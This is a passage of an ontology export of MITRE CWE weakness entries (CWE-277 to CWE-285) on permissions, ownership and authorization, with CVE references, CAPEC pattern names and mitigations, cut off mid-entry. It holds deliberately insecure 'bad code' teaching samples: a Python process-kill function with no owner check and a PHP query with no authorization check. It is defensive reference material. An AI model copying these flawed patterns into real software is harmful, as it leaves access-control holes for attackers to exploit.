     Annotations: rdfs:comment "Insecure umask for core dumps [is the umask preserved or assigned?]."^^xsd:string
                 
                 references  CVE-2002-1786,
     
     Annotations: rdfs:comment "User's umask is used when creating temp files."^^xsd:string
                 
                 related_attack_patterns  CVE-2005-1841,
     ID  "277"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-279_Incorrect_Execution-Assigned_Permissions

    Annotations: 
        rdfs:comment "While it is executing, the software sets the permissions of an object in a way that violates the intended permissions that have been specified by the user."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Log files opened read/write."^^xsd:string
                 
                 references  CVE-2002-0265,
     
     Annotations: rdfs:comment "Log files opened read/write."^^xsd:string
                 
                 references  CVE-2003-0876,
     
     Annotations: rdfs:comment "Web Logs Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-81,
     ID  "279"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-280_Improper_Handling_of_Insufficient_Permissions_or_Privileges

    Annotations: 
        rdfs:comment "Maintenance:
CWE-280 and CWE-274 are too similar."^^xsd:string,
        rdfs:comment "Relationship:
This can be both primary and resultant. When primary, it can expose a variety of weaknesses because a resource might not have the expected state, and subsequent operations might fail. It is often resultant from Unchecked Error Condition (CWE-391)."^^xsd:string,
        rdfs:comment "Research Gap:
This type of issue is under-studied, since researchers often concentrate on whether an object has too many permissions, instead of not enough. These weaknesses are likely to appear in environments with fine-grained models for permissions and privileges, which can include operating systems and other large-scale software packages. However, even highly simplistic permission/privilege models are likely to contain these issues if the developer has not considered the possibility of access failure."^^xsd:string,
        rdfs:comment "The application does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the application in an invalid state."^^xsd:string,
        rdfs:comment "Theoretical:
Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource)."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Special file system allows attackers to prevent ownership/permission change of certain entries by opening the entries before calling a setuid program."^^xsd:string
                 
                 references  CVE-2003-0501,
     
     Annotations: rdfs:comment "FTP server places a user in the root directory when the user's permissions prevent access to the their own home directory."^^xsd:string
                 
                 references  CVE-2004-0148,
     ID  "280"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Always check to see if you have successfully accessed a resource or system functionality, and use proper error handling if it is unsuccessful. Do this even when you are operating in a highly privileged mode, because errors or environmental conditions might still cause a failure. For example, environments with highly granular permissions/privilege models, such as Windows or Linux capabilities, can cause unexpected failures."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-281_Improper_Preservation_of_Permissions

    Annotations: 
        rdfs:comment "The software does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "File is made world-readable when being cloned."^^xsd:string
                 
                 references  CVE-2001-0195,
     
     Annotations: rdfs:comment "Automatic modification of permissions inherited from another file system."^^xsd:string
                 
                 references  CVE-2001-1515,
     
     Annotations: rdfs:comment "Incorrect ACLs used when restoring backups from directories that use symbolic links."^^xsd:string
                 
                 references  CVE-2002-2323,
     
     Annotations: rdfs:comment "Permissions on backup file are created with defaults, possibly less secure than original file."^^xsd:string
                 
                 references  CVE-2005-1920,
     ID  "281"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "This is resultant from errors that prevent the permissions from being preserved. (where the weakness is a quality issue that might indirectly make it easier to introduce security-relevant weaknesses or make them more difficult to detect)"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-282_Improper_Ownership_Management

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Maintenance:
The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-396)."^^xsd:string,
        rdfs:comment "The software assigns the wrong ownership, or does not properly verify the ownership, of an object or resource."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Program runs setuid root but relies on a configuration file owned by a non-root user."^^xsd:string
                 
                 references  CVE-1999-1125,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     ID  "282"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Very carefully manage setting, management, and handling of privileges. Explicity manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage setting, management, and handling of privileges. Explicity manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-283_Unverified_Ownership

    Annotations: 
        rdfs:comment "Relationship:
This overlaps insufficient comparison, verification errors, permissions, and privileges."^^xsd:string,
        rdfs:comment "The software does not properly verify that a critical resource is owned by the proper entity."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Program does not verify the owner of a UNIX socket that is used for sending a password."^^xsd:string
                 
                 references  CVE-2001-0178,
     
     Annotations: rdfs:comment "Owner of special device not checked, allowing root."^^xsd:string
                 
                 references  CVE-2004-2012,
     ID  "283"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain unauthorized access to system resources."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This function is part of a privileged program that takes input from users with potentially lower privileges.

Example Language: Python  /* (bad code) */
def killProcess(processID):
os.kill(processID, signal.SIGKILL)
This code does not confirm that the process to be killed is owned by the requesting user, thus allowing an attacker to kill arbitrary processes.

This function remedies the problem by checking the owner of the process before killing it:

Example Language: Python  /* (good code) */
def killProcess(processID):
user = getCurrentUser()

#Check process owner against requesting user 
if getProcessOwner(processID) == user:
os.kill(processID, signal.SIGKILL)
return

else:
print(\"You cannot kill a process you don't own\")
return"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-284_Improper_Access_Control

    Annotations: 
        rdfs:comment "Access control involves the use of several protection mechanisms such as:
- Authentication (proving the identity of an actor)
- Authorization (ensuring that a given actor can access a resource), and
- Accountability (tracking of activities that were performed)
When any mechanism is not applied or otherwise fails, attackers can compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc.

There are two distinct behaviors that can introduce access control weaknesses:
- Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.
- Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies."^^xsd:string,
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Alternate Terms
Authorization:	
The terms \"access control\" and \"authorization\" are often used interchangeably, although many people have distinct definitions. The CWE usage of \"access control\" is intended as a general term for the various mechanisms that restrict which users can access which resources, and \"authorization\" is more narrowly defined. It is unlikely that there will be community consensus on the use of these terms."^^xsd:string,
        rdfs:comment "Maintenance:
This item needs more work. Possible sub-categories include:
- * Trusted group includes undesired entities (partially covered by CWE-286)
- * Group can perform undesired actions
- * ACL parse error does not fail closed"^^xsd:string,
        rdfs:comment "The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "MyBB (aka MyBulletinBoard) before 1.4.12 allows remote authenticated users to bypass intended restrictions on the number of [img] MyCodes by editing a post after it has been created."^^xsd:string
                 
                 references  CVE-2010-4624,
     
     Annotations: rdfs:comment "Embedding Scripts within Scripts"^^xsd:string
                 
                 related_attack_patterns  CAPEC-19,
     
     Annotations: rdfs:comment "Malicious Logic Insertion"^^xsd:string
                 
                 related_attack_patterns  CAPEC-441,
     
     Annotations: rdfs:comment "Signature Spoofing by Key Theft"^^xsd:string
                 
                 related_attack_patterns  CAPEC-474,
     
     Annotations: rdfs:comment "Malicious Root Certificate"^^xsd:string
                 
                 related_attack_patterns  CAPEC-479,
     
     Annotations: rdfs:comment "Data Injected During Configuration"^^xsd:string
                 
                 related_attack_patterns  CAPEC-536,
     
     Annotations: rdfs:comment "Probe Application Memory"^^xsd:string
                 
                 related_attack_patterns  CAPEC-546,
     ID  "284"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-285_Improper_Authorization

    Annotations: 
        rdfs:comment "Alternate Terms
AuthZ:	
\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is also distinct from \"AuthC,\" which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."^^xsd:string,
        rdfs:comment "Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.

When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution."^^xsd:string,
        rdfs:comment "Background Details
An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."^^xsd:string,
        rdfs:comment "The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions."^^xsd:string
                 
                 references  CVE-2001-1155,
     
     Annotations: rdfs:comment "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied."^^xsd:string
                 
                 references  CVE-2005-2801,
     
     Annotations: rdfs:comment "OS kernel does not check for a certain privilege before setting ACLs for files."^^xsd:string
                 
                 references  CVE-2005-3623,
     
     Annotations: rdfs:comment "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header."^^xsd:string
                 
                 references  CVE-2006-6679,
     
     Annotations: rdfs:comment "Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries."^^xsd:string
                 
                 references  CVE-2007-2925,
     
     Annotations: rdfs:comment "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access."^^xsd:string
                 
                 references  CVE-2008-3424,
     
     Annotations: rdfs:comment "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions."^^xsd:string
                 
                 references  CVE-2008-4577,
     
     Annotations: rdfs:comment "System monitoring software allows users to bypass authorization by creating custom forms."^^xsd:string
                 
                 references  CVE-2008-5027,
     
     Annotations: rdfs:comment "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect."^^xsd:string
                 
                 references  CVE-2008-6123,
     
     Annotations: rdfs:comment "Product does not check the ACL of a page accessed using an \"include\" directive, allowing attackers to read unauthorized files."^^xsd:string
                 
                 references  CVE-2008-6548,
     
     Annotations: rdfs:comment "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client."^^xsd:string
                 
                 references  CVE-2008-7109,
     
     Annotations: rdfs:comment "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges."^^xsd:string
                 
                 references  CVE-2009-0034,
     
     Annotations: rdfs:comment "Gateway uses default \"Allow\" configuration for its authorization settings."^^xsd:string
                 
                 references  CVE-2009-2213,
     
     Annotations: rdfs:comment "Terminal server does not check authorization for guest access."^^xsd:string
                 
                 references  CVE-2009-2282,
     
     Annotations: rdfs:comment "Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users."^^xsd:string
                 
                 references  CVE-2009-2960,
     
     Annotations: rdfs:comment "Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords."^^xsd:string
                 
                 references  CVE-2009-3168,
     
     Annotations: rdfs:comment "Database server does not use appropriate privileges for certain sensitive operations."^^xsd:string
                 
                 references  CVE-2009-3230,
     
     Annotations: rdfs:comment "Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request."^^xsd:string
                 
                 references  CVE-2009-3597,
     
     Annotations: rdfs:comment "Content management system does not check access permissions for private files, allowing others to view those files."^^xsd:string
                 
                 references  CVE-2009-3781,
     
     Annotations: rdfs:comment "Accessing Functionality Not Properly Constrained by ACLs"^^xsd:string
                 
                 related_attack_patterns  CAPEC-1,
     
     Annotations: rdfs:comment "Cross Zone Scripting"^^xsd:string
                 
                 related_attack_patterns  CAPEC-104,
     
     Annotations: rdfs:comment "Directory Indexing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-127,
     
     Annotations: rdfs:comment "Subverting Environment Variable Values"^^xsd:string
                 
                 related_attack_patterns  CAPEC-13,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     
     Annotations: rdfs:comment "Buffer Overflow via Symbolic Links"^^xsd:string
                 
                 related_attack_patterns  CAPEC-45,
     
     Annotations: rdfs:comment "Modification of Windows Service Configuration"^^xsd:string
                 
                 related_attack_patterns  CAPEC-478,
     
     Annotations: rdfs:comment "Poison Web Service Registry"^^xsd:string
                 
                 related_attack_patterns  CAPEC-51,
     
     Annotations: rdfs:comment "Disable Security Software"^^xsd:string
                 
                 related_attack_patterns  CAPEC-578,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     
     Annotations: rdfs:comment "Reusing Session IDs (aka Session Replay)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-60,
     
     Annotations: rdfs:comment "Collect Data from Registries"^^xsd:string
                 
                 related_attack_patterns  CAPEC-647,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     
     Annotations: rdfs:comment "Manipulating User-Controlled Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-77,
     
     Annotations: rdfs:comment "Forceful Browsing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-87,
     ID  "285"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity",
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Authorization weaknesses may arise when a single-user application is ported to a multi-user environment."^^xsd:string, 
                 rdfs:comment "Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.
Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role."^^xsd:string, 
                 rdfs:comment "Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor."^^xsd:string, 
                 rdfs:comment "For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.
One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45]."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  "",
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Application Data",
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Files or Directories",
     
     Annotations: rdfs:comment "Example 1
This function runs an arbitrary SQL query on a given database, returning the result of the query.

Example Language: PHP /* (bad code) */
function runEmployeeQuery($dbName, $name){
mysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName);
//Use a prepared statement to avoid CWE-89 
$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
$preparedStatement->execute(array(':name' => $name));
return $preparedStatement->fetchAll();
}
/.../ 

$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);
While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database."^^xsd:string, 
                 rdfs:comment "Example 2
